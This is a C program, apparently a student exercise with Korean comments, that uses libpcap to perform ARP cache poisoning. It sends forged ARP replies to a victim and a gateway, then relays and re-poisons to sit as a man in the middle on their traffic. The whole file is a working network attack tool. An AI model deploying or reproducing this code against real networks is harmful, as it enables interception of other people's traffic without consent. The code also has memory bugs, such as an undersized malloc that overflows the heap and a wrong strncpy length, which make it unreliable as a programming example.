#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <malloc.h>

#pragma pack(push,1)
struct arp_packet{
    u_int8_t ether_dhost[6];
    u_int8_t ether_shost[6];
    u_int16_t ether_type;
    u_int16_t hwtype;
    u_int16_t protocol;
    u_int8_t hwsize;
    u_int8_t protosize;
    u_int16_t opcode;
    u_int8_t sender_mac[6];
    u_int8_t sender_ip[4];
    u_int8_t target_mac[6];
    u_int8_t target_ip[4];
};
#pragma pop

void usage() {
    printf("syntax: pcap_test <interface> <sender ip> <target ip>\n");
    printf("sample: pcap_test wlan0\n");
}
void get_mac(char*interface,u_char*src_mac,u_char*src_ip){
    int ifindex = 0; // 인덱스를 저장할 변수
    int i;
    struct ifreq ifr; // ifreq 구조체를 생성한다.
    int sock = socket(AF_PACKET,SOCK_RAW,0); // 소켓을 만들어준다(파일 디스크립터)
    strncpy(ifr.ifr_name, interface,sizeof(interface)-1); // 원하는 인퍼페이스의 이름을 명시
    if(ioctl(sock,SIOCGIFINDEX, &ifr) == -1) // sock과 관련된 인터페이스의 인덱스 번호>를 ifr에 넣어달라.
    {                                                   // 실패시 반환 -1
        perror("ioctl error[IFINDEX]");
        exit(-1);
    }
    ifindex = ifr.ifr_ifindex; // ifr 구조체에 저장되어있는 인덱스 번호를 변수에 저장한>다.
    if(ioctl(sock,SIOCGIFHWADDR, &ifr) == -1) // sock과 관련된 물리적 주소를 ifr에 넣어>달라
    {
        perror("Fail..ioctl error[IFHWADDR]");
        exit(-1);
    }
    for(i = 0 ; i < 6 ; i++){
        src_mac[i] = ifr.ifr_hwaddr.sa_data[i];  // ifr 구조체에 저장되어있는 물리적 주>소를 저장한다.
    }
    if(ioctl(sock,SIOCGIFADDR, &ifr) == -1) // sock과 관련된 물리적 주소를 ifr에 넣어>달라
    {
        perror("Fail..ioctl error[IFHWADDR]");
        exit(-1);
    }
    printf("\n");
    for(i=0; i<4; i++){
        src_ip[i]=ifr.ifr_addr.sa_data[i+2];
    }
    printf("[+] my IP Addr :  %d.%d.%d.%d\n",src_ip[0],src_ip[1],src_ip[2],src_ip[3]);
    printf("[+] my Mac Addr :  %02X:%02X:%02X:%02X:%02X:%02X \n",src_mac[0],src_mac[1],src_mac[2],src_mac[3],src_mac[4],src_mac[5]);
}
void stringToip(char*convertip, u_char*converted){
    sscanf(convertip, "%d.%d.%d.%d", &converted[0],&converted[1],&converted[2],&converted[3]);
}
int check_ether(const u_char*packet,u_char*cmp_mac) {
    if(memcmp(packet,cmp_mac,6)==0){//cmp dstmac
        if (packet[12]== 0x08 && packet[13]==0x06) {//catch arp
            if(packet[21]==0x02){//catch reply
                return 1;
            }
            else if (packet[21]==0x01) {//catch arp request
                return 2;
            }
        }

    }else
        return 0;
}
int check_packet(const u_char*packet, u_char*src,u_char*vic,u_char*tar,u_char*vic_ip){
    if((memcmp(packet,src,6)==0)&&(memcmp(packet+6,vic,6)==0)){//victim's
       if((memcmp(packet+26,vic_ip,4)==0)){
            printf("victim's\n");
            return 3;
        }
    }
    else if ((memcmp(packet,src,6)==0)&&(memcmp(packet+6,tar,6)==0)){//gateway's
        if((memcmp(packet+30,vic_ip,4)==0)){
            printf("gate's\n");
            return 4;
        }
    }
}
arp_packet* makeRequestPacket(u_char*src_mac, u_char*src_ip,u_char*sender_ip){
    struct arp_packet *tmp = (arp_packet*)malloc(sizeof(struct arp_packet));
    memcpy(tmp->ether_dhost, "\xff\xff\xff\xff\xff\xff", 6);
    memcpy(tmp->ether_shost, src_mac, 6);
    tmp->ether_type=htons(0x0806);
    tmp->hwtype=htons(0x0001);
    tmp->protocol=htons(0x0800);
    tmp->hwsize=0x06;
    tmp->protosize=0x04;
    tmp->opcode=htons(0x0001);//request opcode
    memcpy(tmp->sender_mac,src_mac,6);
    memcpy(tmp->sender_ip,src_ip,4);
    memcpy(tmp->target_mac, "\x00\x00\x00\x00\x00\x00", 6);
    memcpy(tmp->target_ip,sender_ip, 4);
    return tmp;
}
arp_packet* makeReplyPacket(u_char*sender_mac,u_char*src_mac,u_char*target_ip,u_char*sender_ip){
    struct arp_packet *tmp = (arp_packet*)malloc(sizeof(struct arp_packet));
    memcpy(tmp->ether_dhost, sender_mac, 6);
    memcpy(tmp->ether_shost, src_mac, 6);
    tmp->ether_type=htons(0x0806);
    tmp->hwtype=htons(0x0001);
    tmp->protocol=htons(0x0800);
    tmp->hwsize=0x06;
    tmp->protosize=0x04;
    tmp->opcode=htons(0x0002);//reply opcode
    memcpy(tmp->sender_mac, src_mac,6);
    memcpy(tmp->sender_ip, target_ip,4);
    memcpy(tmp->target_mac, sender_mac, 6);
    memcpy(tmp->target_ip,sender_ip, 4);
    return tmp;
    free(tmp);
}
u_char* change_packet(const u_char*reply_packet, u_char*dst_mac, u_char*src_mac,int size){
    u_char*tmp=(u_char*)malloc(sizeof(size));
    memcpy(tmp,reply_packet,size);
    memcpy(tmp,dst_mac,6);
    memcpy(tmp+6,src_mac,6);
    return tmp;

}
int main(int argc, char*argv[]){
    if (argc != 4) {
       usage();
     }
    //open pcap
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (handle == NULL) {
       fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
       return -1;
     }

    u_char src_mac[6];
    u_char src_ip[4];
    get_mac(argv[1],src_mac, src_ip);//get mac
    //change string to ip
    u_char sender_ip[4];
    u_char target_ip[4];
    stringToip(argv[2],sender_ip);
    stringToip(argv[3],target_ip);


    //pollute victim00:0c:29:62:fe:52
    //1. send arp request
    struct arp_packet*Arp_packet;
    Arp_packet=makeRequestPacket(src_mac,src_ip,sender_ip);
    printf("[+] send fake request\n");
    for(int i=0; i<42; i++){
        printf("%02x ", Arp_packet->ether_dhost[i]);
        if((i+1)%8==0)
            printf("\t");
        if((i+1)%16==0)
            printf("\n");
    }printf("\n");
    //2. catch arp reply
    struct pcap_pkthdr* header;
    const u_char* reply_packet;
    u_int8_t sender_mac[6];
    while(1){
        pcap_sendpacket(handle,(const u_char*)Arp_packet,42);
        sleep(1);
        pcap_next_ex(handle, &header,&reply_packet);
        if(header->caplen!=0)
        if (check_ether(reply_packet,src_mac)==1) {//check arp and reply
            //get mac address,
            memcpy(sender_mac,reply_packet+6,6);//copy victim's mac
            printf("[+] pollute victim's arp cache\n");
            printf("[+] @@@@@@@@@victim's mac : %02x:%02x:%02x:%02x:%02x:%02x \n",sender_mac[0],sender_mac[1],sender_mac[2],sender_mac[3],sender_mac[4],sender_mac[5]);
            break;
        }

    }
    free(Arp_packet);

    //3. make fake apr reply
      Arp_packet=makeReplyPacket(sender_mac,src_mac,target_ip,sender_ip);
      printf("[+] make fake reply  \n");
      for(int i=0; i<42; i++){
          printf("%02x ",Arp_packet->ether_dhost[i]);
          if((i+1)%8==0)
                     printf("\t");
          if((i+1)%16==0)
              printf("\n");
      }
      pcap_sendpacket(handle,(u_char*)Arp_packet,42);
      printf("\n");
      printf("[+] success pollute arp cache\n\n");
      free(Arp_packet);

      //4. find gateway's mac address
      Arp_packet=makeRequestPacket(src_mac,src_ip,target_ip);
      printf("[+] send request to gateway\n");
      for(int i=0; i<42; i++){
          printf("%02x ", Arp_packet->ether_dhost[i]);
          if((i+1)%8==0)
              printf("\t");
          if((i+1)%16==0)
              printf("\n");
      }printf("\n");
      u_int8_t target_mac[6];
      while(1){
          pcap_sendpacket(handle,(const u_char*)Arp_packet,42);
          sleep(1);
          pcap_next_ex(handle, &header,&reply_packet);
          if(header->caplen!=0)
          if ((check_ether(reply_packet,src_mac)==1) && (memcmp(reply_packet+28,target_ip,4)==0)) {//check arp and reply
              //get mac address,
              memcpy(target_mac,reply_packet+6,6);//copy target's mac
              printf("[+] @@@@@@@@@@@gateway's mac : %02x:%02x:%02x:%02x:%02x:%02x \n",target_mac[0],target_mac[1],target_mac[2],target_mac[3],target_mac[4],target_mac[5]);
              break;
          }
        }
      free(Arp_packet);

      //5. start parsing
      u_char *re_packet;
      struct arp_packet*Arp_packet2;
      Arp_packet=makeReplyPacket(sender_mac,src_mac,target_ip,sender_ip);
      Arp_packet2=makeReplyPacket(target_mac,src_mac,sender_ip,target_ip);
      int i=0;
      while(1){
          int res = pcap_next_ex(handle, &header,&reply_packet);
          if (res == 0) continue;
          if (res == -1 || res == -2) break;
          if((check_ether(reply_packet,src_mac)==2) && (memcmp(reply_packet+28,sender_ip,4)==0)){//if to me
              pcap_sendpacket(handle,(const u_char*)Arp_packet,42);//pollute arp cache again
              pcap_sendpacket(handle,(const u_char*)Arp_packet2,42);//pollute arp cache again
              printf("[%d] pollute onemore time\n",i++);
          }
          else if(check_packet(reply_packet,src_mac,sender_mac,target_mac ,sender_ip)==3){//if this is victim's request
                re_packet=change_packet(reply_packet,target_mac,src_mac,header->caplen);//make request packet
                pcap_sendpacket(handle,re_packet,header->caplen);
                pcap_sendpacket(handle,(const u_char*)Arp_packet,42);//pollute arp cache again

          }
          else if(check_packet(reply_packet,src_mac,sender_mac,target_mac,sender_ip)==4){//if this is gateways's reply
                re_packet=change_packet(reply_packet,sender_mac,src_mac,header->caplen);
                pcap_sendpacket(handle,re_packet,header->caplen);
                pcap_sendpacket(handle,(const u_char*)Arp_packet,42);//pollute arp cache again

          }else {
              pcap_sendpacket(handle,(const u_char*)Arp_packet,42);//pollute arp cache again
              pcap_sendpacket(handle,(const u_char*)Arp_packet2,42);//pollute arp cache again

          }
      }
      free(Arp_packet);
      printf("end program\n");
      pcap_close(handle);
}

